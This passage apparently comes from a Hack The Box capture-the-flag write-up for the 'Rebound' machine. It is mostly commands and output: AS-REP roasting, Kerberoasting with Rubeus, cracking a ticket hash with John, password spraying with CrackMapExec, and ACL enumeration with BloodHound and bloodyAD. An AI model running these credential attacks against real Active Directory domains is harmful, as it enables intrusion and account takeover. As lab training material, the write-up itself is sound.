Impacket v0.11.0 - Copyright 2023 Fortra

[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jjones@REBOUND.HTB:03570d084a948dbb9991005f35e66530$90f8f8358070ad5eea216ab0795751cce232c8d427d3ceb6a1f36ac6565f2e599fb1f6a8ec9a20ada93fb126678769dab7a7e130e47bef5e7abceb6557fd75aa8c27dd56710bd9df3871258a1f1ae3119b132541c3c1a19a3b85e77a705fe867b199672705734fc6bfa45926a65d34f1f6ddee2197537114b880c55fb9233302b7e8bd4cdb1409c93b9b10629bf157e03cf5f1298a9c7d6e79d49d9e3a53886bf3bb7117fbe96e19a72f62ea795fa701564ad6716cc803bd9504372530fab5c7fa1dd6a47c77525fb293effe32e8647fab7022e974348925b889989cad2dc1e52dbd5e8485dfdfbc2a6d
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### Further Enumeration of SMB with CrackMapExec

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ crackmapexec smb 10.129.112.203 -u usernames.txt -p '' --shares
SMB         10.129.112.203  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.129.112.203  445    DC01             [-] rebound.htb\tbrady: STATUS_LOGON_FAILURE 
SMB         10.129.112.203  445    DC01             [-] rebound.htb\ldap_monitor: STATUS_LOGON_FAILURE 
SMB         10.129.112.203  445    DC01             [-] rebound.htb\oorend: STATUS_LOGON_FAILURE 
SMB         10.129.112.203  445    DC01             [+] rebound.htb\ServiceMgmt: 
SMB         10.129.112.203  445    DC01             [*] Enumerated shares
SMB         10.129.112.203  445    DC01             Share           Permissions     Remark
SMB         10.129.112.203  445    DC01             -----           -----------     ------
SMB         10.129.112.203  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.112.203  445    DC01             C$                              Default share
SMB         10.129.112.203  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.112.203  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.112.203  445    DC01             Shared          READ            
SMB         10.129.112.203  445    DC01             SYSVOL                          Logon server share
```

## Kerberoasting

> https://www.semperis.com/blog/new-attack-paths-as-requested-sts/

```c
PS C:\opt\Rubeus > .\Rubeus.exe kerberoast /nopreauth:jjones /domain:rebound.htb /dc:10.129.112.203 /spns:usernames.txt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Kerberoasting

[*] Using jjones without pre-auth to request service tickets

[*] Target SPN             : tbrady
[*] Using domain controller: 10.129.112.203

[*] Target SPN             : ldap_monitor
[*] Using domain controller: 10.129.112.203
[*] Hash                   : $krb5tgs$23$*ldap_monitor$rebound.htb$ldap_monitor*$2E22A3A2A0CBCAC8FA71DC57649FCCF3$029A52581F64F38D6C7174D9A8101595351B6414B306E520AD8E88C68A7F2EC26505E25D7FBE2874C46FE66CD477B2988D7CA5FBB2C3EF030A7236595AEDCDF86CD2F89096DE4909C7B5FE180DBCA65CC0800DB163F2D781320028C10A10FE2B529F4C1971FAEAD5CF5A2F19B088CB0D97AE4B5B2DD08DF8F236836D0B1F41ACCA2561B23932D0F9353455BFEADBFA61BB8E78C454D4A9593C08A09DF11E0EC6F043840EEA4F2F20816D319FCE3753D7D8CCEF67A711552A81370B12FA165D061241240BE81B04587FEE76A0914C3A75341240DD3B15F04DFB8BBEBD2F5799DE24B9B3DFA002E47620217F38C8AE079731A9CAF9EDB6822B64CF7AA918D55E4EDCFB046C057A569744786E2FF01C201C36E05BCD024211BEEE975C81E587274882C1706F025285731D9A1A660A019790A041B5C157021079291F4D634FB1696C86F9C76E0106A831600D8B226D235E2B4C15F48FDAE251A3366BCA9497A5671E1F4DDD25D30DDFD1FCC5CD60FB69334E9D0AE80577896CA218A3F489F3C3255A3BB4C1A156B4BF335C11E7F452D56299230F5A3646D7A58427E5A9A26F4F11A797030407BEA40A9A14BA7892496B2CE6CF4E7628774628DBB1425E30A3A0853BAD561AF29C36DB26C4EB7C2C5C04E8BAC8E534890604BD1585DF4C6FC3C6A0114C86BAD6422F4A11A643E3A541A9E00769009257773221490543AB7A5C21FCA0A1A977AC7A813987CDCF2BB1B7B535E2EE084D8A4821E7477BEFDC440CBA9B2F28BE5528E099E13C89F8F029EA830F527615B8C29A01FCD3C23E79250F10B9457176B452EAE61DB8C197026122530FC68E0EFCF32745C1E3729645C57C5F0BB27E6FCC42C59C23CCA079BA76AFB0D28707BD31C9CA4DA1E59CBC12F7AC114B5790A17CC18BFD873BB67F8577F11262399DA9BB0A81618EB42CB715049233A76C607B641044F94C17CE3187B1ABBEAB2E59F5F578CBF392BEA3E0B3E2D37039BFDAD6510B6890D63A54B2C28AD07DF172E470B2279D08313180CF5D928D24EF1683D3C29989A9F8AFA40E299A773F6E676AFC5CAE57526A2ACCD448EBA0BCDD6AC347D5C0E47184B450842C97D89D0238A0733C0B138FD314F055C784BF3B47D156FD5B30494A68482E601CDA56E1A46C3BD2DF2386C4F5D776B5FB2E99B88FED6BC72D59EE0DBA53FAE3EF7F062677051B4905B76C4729961E61008485DD4D13DCF8D8CADE3434316CD580A315143FE800F8EB984BDEA71F426128DE6538F621B23D77885DC2B055A32081C24AF5DEFC6A6D40ADEB0856A346E051EC613B643A6727ACB7F248E93A4D8722478833FD21D750

[*] Target SPN             : oorend
[*] Using domain controller: 10.129.112.203

[*] Target SPN             : ServiceMgmt
[*] Using domain controller: 10.129.112.203

[*] Target SPN             : winrm_svc
[*] Using domain controller: 10.129.112.203

[*] Target SPN             : DnsAdmins
[*] Using domain controller: 10.129.112.203

[*] Target SPN             : DnsUpdateProxy
[*] Using domain controller: 10.129.112.203

[*] Target SPN             : ppaul
[*] Using domain controller: 10.129.112.203

[*] Target SPN             : llune
[*] Using domain controller: 10.129.112.203

[*] Target SPN             : fflock
[*] Using domain controller: 10.129.112.203

[*] Target SPN             : jjones
[*] Using domain controller: 10.129.112.203

[*] Target SPN             : mmalone
[*] Using domain controller: 10.129.112.203

[*] Target SPN             : nnoon
[*] Using domain controller: 10.129.112.203
COMMANDO 09/09/2023 14:07:40
```

## Cracking the Hash with John

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ cat hash
$krb5tgs$23$*ldap_monitor$rebound.htb$ldap_monitor*$2E22A3A2A0CBCAC8FA71DC57649FCCF3$029A52581F64F38D6C7174D9A8101595351B6414B306E520AD8E88C68A7F2EC26505E25D7FBE2874C46FE66CD477B2988D7CA5FBB2C3EF030A7236595AEDCDF86CD2F89096DE4909C7B5FE180DBCA65CC0800DB163F2D781320028C10A10FE2B529F4C1971FAEAD5CF5A2F19B088CB0D97AE4B5B2DD08DF8F236836D0B1F41ACCA2561B23932D0F9353455BFEADBFA61BB8E78C454D4A9593C08A09DF11E0EC6F043840EEA4F2F20816D319FCE3753D7D8CCEF67A711552A81370B12FA165D061241240BE81B04587FEE76A0914C3A75341240DD3B15F04DFB8BBEBD2F5799DE24B9B3DFA002E47620217F38C8AE079731A9CAF9EDB6822B64CF7AA918D55E4EDCFB046C057A569744786E2FF01C201C36E05BCD024211BEEE975C81E587274882C1706F025285731D9A1A660A019790A041B5C157021079291F4D634FB1696C86F9C76E0106A831600D8B226D235E2B4C15F48FDAE251A3366BCA9497A5671E1F4DDD25D30DDFD1FCC5CD60FB69334E9D0AE80577896CA218A3F489F3C3255A3BB4C1A156B4BF335C11E7F452D56299230F5A3646D7A58427E5A9A26F4F11A797030407BEA40A9A14BA7892496B2CE6CF4E7628774628DBB1425E30A3A0853BAD561AF29C36DB26C4EB7C2C5C04E8BAC8E534890604BD1585DF4C6FC3C6A0114C86BAD6422F4A11A643E3A541A9E00769009257773221490543AB7A5C21FCA0A1A977AC7A813987CDCF2BB1B7B535E2EE084D8A4821E7477BEFDC440CBA9B2F28BE5528E099E13C89F8F029EA830F527615B8C29A01FCD3C23E79250F10B9457176B452EAE61DB8C197026122530FC68E0EFCF32745C1E3729645C57C5F0BB27E6FCC42C59C23CCA079BA76AFB0D28707BD31C9CA4DA1E59CBC12F7AC114B5790A17CC18BFD873BB67F8577F11262399DA9BB0A81618EB42CB715049233A76C607B641044F94C17CE3187B1ABBEAB2E59F5F578CBF392BEA3E0B3E2D37039BFDAD6510B6890D63A54B2C28AD07DF172E470B2279D08313180CF5D928D24EF1683D3C29989A9F8AFA40E299A773F6E676AFC5CAE57526A2ACCD448EBA0BCDD6AC347D5C0E47184B450842C97D89D0238A0733C0B138FD314F055C784BF3B47D156FD5B30494A68482E601CDA56E1A46C3BD2DF2386C4F5D776B5FB2E99B88FED6BC72D59EE0DBA53FAE3EF7F062677051B4905B76C4729961E61008485DD4D13DCF8D8CADE3434316CD580A315143FE800F8EB984BDEA71F426128DE6538F621B23D77885DC2B055A32081C24AF5DEFC6A6D40ADEB0856A346E051EC613B643A6727ACB7F248E93A4D8722478833FD21D750
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
[sudo] password for user: 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1GR8t@$$4u       (?)     
1g 0:00:00:09 DONE (2023-09-09 21:08) 0.1085g/s 1415Kp/s 1415Kc/s 1415KC/s 1Gobucs!..1DENA
Use the "--show" option to display all of the cracked passwords reliably
```

| Username | Password |
| --- | --- |
| ldapmonitor | 1GR8t@$$4u |

## Password Spray with CrackMapExec

```c
┌──(user㉿kali)-[~]
└─$ net time \\dc01.rebound.htb /set /y
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ crackmapexec smb 10.129.112.203 -u oorend -p '1GR8t@$$4u' --shares 
SMB         10.129.112.203  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.129.112.203  445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
SMB         10.129.112.203  445    DC01             [*] Enumerated shares
SMB         10.129.112.203  445    DC01             Share           Permissions     Remark
SMB         10.129.112.203  445    DC01             -----           -----------     ------
SMB         10.129.112.203  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.112.203  445    DC01             C$                              Default share
SMB         10.129.112.203  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.112.203  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.112.203  445    DC01             Shared          READ            
SMB         10.129.112.203  445    DC01             SYSVOL          READ            Logon server share
```

| Username | Password |
| --- | --- |
| oorend | 1GR8t@$$4u |

## LDAP Monitoring

> https://github.com/p0dalirius/LDAPmonitor/releases

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.112.203  rebound.htb
10.129.112.203  dc01.rebound.htb
10.129.112.203  dc01
```

### Grabbing Kerberos Ticket

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ sudo /etc/init.d/virtualbox-guest-utils stop
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ sudo systemctl stop systemd-timesyncd
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ sudo ntpdate 10.129.112.203                          
2023-09-10 16:24:57.857001 (+0000) +25195.584650 +/- 0.023303 10.129.112.203 s1 no-leap
CLOCK: time stepped by 25195.584650
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ impacket-getTGT rebound.htb/ldap_monitor:'1GR8t@$$4u'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in ldap_monitor.ccache
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ export KRB5CCNAME=ldap_monitor.ccache
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ python3 /home/user/opt/10_post_exploitation/ldapmonitor/pyLDAPmonitor.py -d rebound.htb -u 'ldap_monitor@dc01.rebound.htb' -p '1GR8t@$$4u' --dc-ip dc01.rebound.htb --use-ldaps -k
[+]======================================================
[+]    LDAP live monitor v1.3        @podalirius_        
[+]======================================================

[>] Trying to connect to DC01 ...
[debug] Using Kerberos Cache: ldap_monitor.ccache
[debug] Using TGT from cache
[>] Listening for LDAP changes ...
[2023-09-10 16:29:06] CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
 | Attribute "whenChanged" changed from '['20230910162505.0Z']' to '['20230910162901.0Z']'
 | Attribute "uSNChanged" changed from '['174887']' to '['174893']'
 | Attribute "pwdLastSet" changed from '['133388367006232109']' to '['133388369405922502']'
 | Attribute "dSCorePropagationData" changed from '['20230910162506.0Z', '20230910162505.0Z', '20230910162501.0Z', '20230910162501.0Z', '16010101000000.0Z']' to '['20230910162901.0Z', '20230910162506.0Z', '20230910162505.0Z', '20230910162501.0Z', '16010101000000.0Z']'                                                                                                              
[2023-09-10 16:29:06] CN=batch_runner,OU=Service Users,DC=rebound,DC=htb
 | Attribute "whenChanged" changed from '['20230910162503.0Z']' to '['20230910162901.0Z']'
 | Attribute "uSNChanged" changed from '['174885']' to '['174896']'
 | Attribute "pwdLastSet" changed from '['133388367013571927']' to '['133388369412340351']'
 | Attribute "dSCorePropagationData" changed from '['20230910162506.0Z', '20230910162503.0Z', '20230910162501.0Z', '20230910162501.0Z', '16010101000000.0Z']' to '['20230910162901.0Z', '20230910162506.0Z', '20230910162503.0Z', '20230910162501.0Z', '16010101000000.0Z']'
```

## Getting Intel zu Gmsa Readablility

```c
┌──(user㉿kali)-[~]
└─$ crackmapexec ldap 10.129.112.203 -u 'ldap_monitor' -p '1GR8t@$$4u' --gmsa -k
SMB         10.129.112.203  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        10.129.112.203  636    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
LDAP        10.129.112.203  636    DC01             [*] Getting GMSA Passwords
LDAP        10.129.112.203  636    DC01             Account: delegator$           NTLM:
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/rebound/files]
└─$ ~/opt/10_post_exploitation/BloodHound.py/bloodhound.py -d 'rebound.htb' -u 'oorend' -p '1GR8t@$$4u' -dc 'dc01.rebound.htb' -c all -ns '10.129.112.203'
INFO: Found AD domain: rebound.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 16 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: gmsa.rebound.htb
INFO: Querying computer: dc01.rebound.htb
WARNING: Could not resolve: gmsa.rebound.htb: The DNS query name does not exist: gmsa.rebound.htb.
INFO: Done in 00M 17S
```

We searched for `Delegator@rebound.htb` and checked his `Explicit Object Controllers`. We found out that `tbrady` has the option to read `GMSA Password` of `delegate$`.

## bloodyAD

```c
┌──(user㉿kali)-[~/opt/10_post_exploitation/bloodyAD]
└─$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.129.112.203 get object 'CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb'        

distinguishedName: CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
cn: ServiceMgmt
dSCorePropagationData: 2023-04-08 09:07:56+00:00; 1601-01-01 00:00:00+00:00
description: Group used for Services Account management
displayName: ServiceMgmt
groupType: -2147483646
instanceType: 4
member: CN=fflock,CN=Users,DC=rebound,DC=htb; CN=ppaul,CN=Users,DC=rebound,DC=htb
nTSecurityDescriptor: O:S-1-5-21-4078382237-1492182817-2568127209-512G:S-1-5-21-4078382237-1492182817-2568127209-512D:AI(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;S-1-5-11)(A;;SW;;;S-1-5-21-4078382237-1492182817-2568127209-7682)(A;;0xf01ff;;;S-1-5-21-4078382237-1492182817-2568127209-512)(A;;0xf01ff;;;S-1-5-32-548)(A;;0x20094;;;S-1-5-10)(A;;0x20094;;;S-1-5-11)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-4078382237-1492182817-2568127209-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-4078382237-1492182817-2568127209-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-4078382237-1492182817-2568127209-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: ServiceMgmt
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=rebound,DC=htb
objectClass: top; group
objectGUID: {a7ea5dce-8c4f-40b5-8863-64fd3c27582d}
objectSid: S-1-5-21-4078382237-1492182817-2568127209-7683
sAMAccountName: ServiceMgmt
sAMAccountType: 268435456
uSNChanged: 102802
uSNCreated: 69317
whenChanged: 2023-04-09 10:24:00+00:00
whenCreated: 2023-04-08 09:07:56+00:00
```

```c
┌──(user㉿kali)-[~]
└─$ bloodyAD -d 'rebound.htb' -u 'oorend' -p '1GR8t@$$4u' --host 'dc01.rebound.htb' get object 'CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb' --resolve-sd                  

distinguishedName: CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
cn: ServiceMgmt
dSCorePropagationData: 2023-04-08 09:07:56+00:00; 1601-01-01 00:00:00+00:00
description: Group used for Services Account management
displayName: ServiceMgmt
groupType: -2147483646
instanceType: 4
member: CN=fflock,CN=Users,DC=rebound,DC=htb; CN=ppaul,CN=Users,DC=rebound,DC=htb
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
nTSecurityDescriptor.ACL.0.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.0.Trustee: WINDOWS_AUTHORIZATION_ACCESS_GROUP
nTSecurityDescriptor.ACL.0.Right: READ_PROP
nTSecurityDescriptor.ACL.0.ObjectType: Token-Groups-Global-And-Universal
nTSecurityDescriptor.ACL.1.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.1.Trustee: AUTHENTICATED_USERS
nTSecurityDescriptor.ACL.1.Right: CONTROL_ACCESS
nTSecurityDescriptor.ACL.1.ObjectType: Send-To
nTSecurityDescriptor.ACL.2.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.2.Trustee: oorend
nTSecurityDescriptor.ACL.2.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.2.ObjectType: Self
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: ACCOUNT_OPERATORS; Domain Admins; LOCAL_SYSTEM
nTSecurityDescriptor.ACL.3.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.3.ObjectType: Self
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.4.Trustee: PRINCIPAL_SELF; AUTHENTICATED_USERS
nTSecurityDescriptor.ACL.4.Right: GENERIC_READ
nTSecurityDescriptor.ACL.4.ObjectType: Self
nTSecurityDescriptor.ACL.5.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.5.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.5.Right: READ_PROP
nTSecurityDescriptor.ACL.5.ObjectType: Account-Restrictions; Group-Membership; Remote-Access-Information; General-Information; Logon-Information
nTSecurityDescriptor.ACL.5.InheritedObjectType: User; inetOrgPerson
nTSecurityDescriptor.ACL.5.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.6.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.6.Trustee: Enterprise Key Admins; Key Admins
nTSecurityDescriptor.ACL.6.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.6.ObjectType: ms-DS-Key-Credential-Link
nTSecurityDescriptor.ACL.6.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.7.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.7.Trustee: PRINCIPAL_SELF; CREATOR_OWNER
nTSecurityDescriptor.ACL.7.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.7.ObjectType: DS-Validated-Write-Computer
nTSecurityDescriptor.ACL.7.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.7.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.8.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.8.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.8.Right: READ_PROP
nTSecurityDescriptor.ACL.8.ObjectType: Token-Groups
nTSecurityDescriptor.ACL.8.InheritedObjectType: User; Computer
nTSecurityDescriptor.ACL.8.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.9.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.9.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.9.Right: READ_PROP
nTSecurityDescriptor.ACL.9.ObjectType: Token-Groups
nTSecurityDescriptor.ACL.9.InheritedObjectType: Group
nTSecurityDescriptor.ACL.9.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.10.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.10.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.10.Right: WRITE_PROP
nTSecurityDescriptor.ACL.10.ObjectType: ms-TPM-Tpm-Information-For-Computer
nTSecurityDescriptor.ACL.10.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.10.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.11.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.11.Right: GENERIC_READ
nTSecurityDescriptor.ACL.11.ObjectType: Self
nTSecurityDescriptor.ACL.11.InheritedObjectType: User; inetOrgPerson
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.12.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.12.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.12.Right: GENERIC_READ
nTSecurityDescriptor.ACL.12.ObjectType: Self
nTSecurityDescriptor.ACL.12.InheritedObjectType: Group
nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.13.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.13.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.13.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.13.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
nTSecurityDescriptor.ACL.13.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
nTSecurityDescriptor.ACL.14.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.14.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.14.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.14.ObjectType: Private-Information
nTSecurityDescriptor.ACL.14.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.15.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.15.Trustee: Enterprise Admins
nTSecurityDescriptor.ACL.15.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.15.ObjectType: Self
nTSecurityDescriptor.ACL.15.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.16.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.16.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.16.Right: LIST_CHILD
nTSecurityDescriptor.ACL.16.ObjectType: Self
nTSecurityDescriptor.ACL.16.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.17.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.17.Trustee: BUILTIN_ADMINISTRATORS
nTSecurityDescriptor.ACL.17.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
nTSecurityDescriptor.ACL.17.ObjectType: Self
nTSecurityDescriptor.ACL.17.Flags: CONTAINER_INHERIT; INHERITED
name: ServiceMgmt
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=rebound,DC=htb
objectClass: top; group
objectGUID: {a7ea5dce-8c4f-40b5-8863-64fd3c27582d}
objectSid: S-1-5-21-4078382237-1492182817-2568127209-7683
sAMAccountName: ServiceMgmt
sAMAccountType: 268435456
uSNChanged: 176644
uSNCreated: 69317
whenChanged: 2023-09-11 01:03:00+00:00
whenCreated: 2023-04-08 09:07:56+00:00
```

```c
nTSecurityDescriptor.ACL.2.Type: == ALLOWED ==
